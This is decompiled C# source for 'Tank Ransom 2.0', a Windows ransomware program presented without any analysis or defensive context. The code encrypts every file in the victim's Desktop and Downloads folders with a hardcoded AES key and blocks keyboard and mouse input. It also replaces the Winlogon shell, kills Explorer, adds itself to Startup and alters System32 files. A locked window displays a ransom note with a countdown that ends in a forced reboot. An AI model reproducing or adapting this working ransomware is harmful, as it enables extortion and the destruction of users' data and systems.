using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using AnimatedText;
using Microsoft.Win32;

namespace TankRansom2._0;

public class Form1 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private IContainer components = null;

	private eLearningSlidingLabel eLearningSlidingLabel1;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Label label5;

	private Label label6;

	private Label label7;

	private Label label8;

	private TextBox textBox1;

	private CheckBox checkBox1;

	private Button button1;

	private Timer heck_desktop;

	private Timer start_encryption;

	private Timer unhide_ransom;

	private Timer countdown;

	private Timer check_box;

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	public Form1()
	{
		InitializeComponent();
		((Control)label7).set_Text(TimeSpan.FromMinutes(60.0).ToString());
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_0122: Expected O, but got Unknown
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		((Form)this).set_Location(new Point(-1000, -1000));
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey.SetValue("Shell", "empty", RegistryValueKind.String);
		File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\TankRansom.exe");
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\TankRansom.exe"))
		{
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\TankRansom.exe");
		}
		File.WriteAllText(folderPath + "\\tank-ransom.sys", "encrypted");
		File.WriteAllText(text + "\\tank-ransom.sys", "encrypted");
		heck_desktop.Start();
		start_encryption.Start();
		countdown.Start();
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label7).set_Text((TimeSpan.FromMinutes(60.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		unhide_ransom.Start();
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void label5_Click(object sender, EventArgs e)
	{
	}

	private void label6_Click(object sender, EventArgs e)
	{
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "")
		{
			MessageBox.Show("Empty input field. Try again!", "Empty", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)textBox1).get_Text() == "XJ9_L4RNY_ST")
		{
			MessageBox.Show("Correct key!", "Password is correct!", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
			RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
			registryKey3.SetValue("NoRun", 0, RegistryValueKind.DWord);
			registryKey3.SetValue("NoClose", 0, RegistryValueKind.DWord);
			File.Delete("C:\\Windows\\System32\\LogonUI.exe");
			File.Copy("C:\\Windows\\System32\\LogonUIreal.exe", "C:\\Windows\\System32\\LogonUI.exe");
			File.Delete("C:\\Windows\\System32\\LogonUIreal.exe");
			File.Delete("C:\\Windows\\System32\\LogonUIfake.exe");
			OFF_Encrypt();
			RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey4.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			Process.Start("C:\\Windows\\explorer.exe");
			Process[] array = null;
			array = Process.GetProcessesByName("TankRansom2.0");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void heck_desktop_Tick(object sender, EventArgs e)
	{
		heck_desktop.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		heck_desktop.Start();
	}

	private void unhide_ransom_Tick(object sender, EventArgs e)
	{
		unhide_ransom.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("explorer");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process.Start("C:\\Windows\\System32\\voice.vbs");
		((Form)this).CenterToScreen();
		BlockInput(block: false);
	}

	private void start_encryption_Tick(object sender, EventArgs e)
	{
		start_encryption.Stop();
		Start_Encrypt();
	}

	private void countdown_Tick(object sender, EventArgs e)
	{
		countdown.Stop();
		Process.Start("shutdown", "/r /t 0");
		Process[] array = null;
		array = Process.GetProcessesByName("wscript");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process[] array3 = null;
		array3 = Process.GetProcessesByName("TankRansom2.0");
		Process[] array4 = array3;
		foreach (Process process2 in array4)
		{
			process2.Kill();
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private static void Start_Encrypt()
	{
		BlockInput(block: true);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "XJ9_L4RNY_ST";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private static void OFF_Encrypt()
	{
		BlockInput(block: true);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "XJ9_L4RNY_ST";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
			BlockInput(block: false);
		}
	}

	private void check_box_Tick(object sender, EventArgs e)
	{
		if (checkBox1.get_Checked())
		{
			textBox1.set_PasswordChar('\0');
		}
		else if (!checkBox1.get_Checked())
		{
			textBox1.set_PasswordChar('*');
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Expected O, but got Unknown
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Expected O, but got Unknown
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_0283: Unknown result type (might be due to invalid IL or missing references)
		//IL_028d: Expected O, but got Unknown
		//IL_0342: Unknown result type (might be due to invalid IL or missing references)
		//IL_034c: Expected O, but got Unknown
		//IL_03e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ee: Expected O, but got Unknown
		//IL_0482: Unknown result type (might be due to invalid IL or missing references)
		//IL_048c: Expected O, but got Unknown
		//IL_0539: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Expected O, but got Unknown
		//IL_0617: Unknown result type (might be due to invalid IL or missing references)
		//IL_0621: Expected O, but got Unknown
		//IL_06c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d0: Expected O, but got Unknown
		//IL_076a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0774: Expected O, but got Unknown
		//IL_07a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a67: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a71: Expected O, but got Unknown
		//IL_0bc0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bca: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		eLearningSlidingLabel1 = new eLearningSlidingLabel();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		label6 = new Label();
		label7 = new Label();
		label8 = new Label();
		textBox1 = new TextBox();
		checkBox1 = new CheckBox();
		button1 = new Button();
		heck_desktop = new Timer(components);
		start_encryption = new Timer(components);
		unhide_ransom = new Timer(components);
		countdown = new Timer(components);
		check_box = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)eLearningSlidingLabel1).set_Font(new Font("Microsoft Sans Serif", 13.8f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)eLearningSlidingLabel1).set_ForeColor(Color.Aqua);
		((Control)eLearningSlidingLabel1).set_Location(new Point(386, 12));
		((Control)eLearningSlidingLabel1).set_Name("eLearningSlidingLabel1");
		((Control)eLearningSlidingLabel1).set_Size(new Size(494, 97));
		eLearningSlidingLabel1.Slide = true;
		eLearningSlidingLabel1.SlideTime = 10;
		((Control)eLearningSlidingLabel1).set_TabIndex(0);
		((Control)eLearningSlidingLabel1).set_Text("                  Oops... Your files has been encrypted by Tank Ransom 2.0");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 7.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Aqua);
		((Control)label1).set_Location(new Point(503, 299));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(254, 16));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("What happened with my computer?");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label2).set_ForeColor(Color.Aqua);
		((Control)label2).set_Location(new Point(503, 325));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(433, 144));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Arial", 7.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Aqua);
		((Control)label3).set_Location(new Point(503, 480));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(206, 16));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("What happens if i don't buy?");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label4).set_ForeColor(Color.Red);
		((Control)label4).set_Location(new Point(503, 505));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(419, 54));
		((Control)label4).set_TabIndex(4);
		((Control)label4).set_Text("If you don't pay by a certain time, turn off the computer or if you\r\ntry to kill the ransomware, all your data will be unrecoverable\r\ndeleted. We strongly recommend to get a decryption code.");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Arial", 7.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Aqua);
		((Control)label5).set_Location(new Point(503, 568));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(116, 16));
		((Control)label5).set_TabIndex(5);
		((Control)label5).set_Text("How to unlock?");
		((Control)label5).add_Click((EventHandler)label5_Click);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label6).set_ForeColor(Color.Aqua);
		((Control)label6).set_Location(new Point(503, 593));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(413, 72));
		((Control)label6).set_TabIndex(6);
		((Control)label6).set_Text(componentResourceManager.GetString("label6.Text"));
		((Control)label6).add_Click((EventHandler)label6_Click);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_BackColor(Color.Transparent);
		label7.set_BorderStyle((BorderStyle)2);
		((Control)label7).set_Font(new Font("Arial Black", 22.2f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label7).set_ForeColor(Color.Aqua);
		((Control)label7).set_Location(new Point(506, 227));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(201, 56));
		((Control)label7).set_TabIndex(8);
		((Control)label7).set_Text("00:00:00");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_BackColor(Color.Transparent);
		((Control)label8).set_Font(new Font("Arial", 7.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.Aqua);
		((Control)label8).set_Location(new Point(503, 199));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(110, 16));
		((Control)label8).set_TabIndex(9);
		((Control)label8).set_Text("Time Remaing:");
		((Control)textBox1).set_BackColor(Color.Black);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)textBox1).set_ForeColor(Color.Aqua);
		((Control)textBox1).set_Location(new Point(49, 568));
		((Control)textBox1).set_Margin(new Padding(4));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(187, 41));
		((Control)textBox1).set_TabIndex(10);
		((Control)textBox1).set_Text("CODE");
		textBox1.set_TextAlign((HorizontalAlignment)2);
		((Control)checkBox1).set_AutoSize(true);
		((Control)checkBox1).set_ForeColor(Color.White);
		((Control)checkBox1).set_Location(new Point(85, 538));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(123, 21));
		((Control)checkBox1).set_TabIndex(11);
		((Control)checkBox1).set_Text("Hide password");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_ForeColor(Color.Aqua);
		((Control)button1).set_Location(new Point(49, 616));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(187, 41));
		((Control)button1).set_TabIndex(12);
		((Control)button1).set_Text("DECRYPT");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		heck_desktop.set_Enabled(true);
		heck_desktop.add_Tick((EventHandler)heck_desktop_Tick);
		start_encryption.set_Enabled(true);
		start_encryption.set_Interval(3000);
		start_encryption.add_Tick((EventHandler)start_encryption_Tick);
		unhide_ransom.set_Interval(10000);
		unhide_ransom.add_Tick((EventHandler)unhide_ransom_Tick);
		countdown.set_Enabled(true);
		countdown.set_Interval(3600000);
		countdown.add_Tick((EventHandler)countdown_Tick);
		check_box.set_Enabled(true);
		check_box.set_Interval(300);
		check_box.add_Tick((EventHandler)check_box_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(950, 677));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)checkBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)eLearningSlidingLabel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Tank Ransom 2.0");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
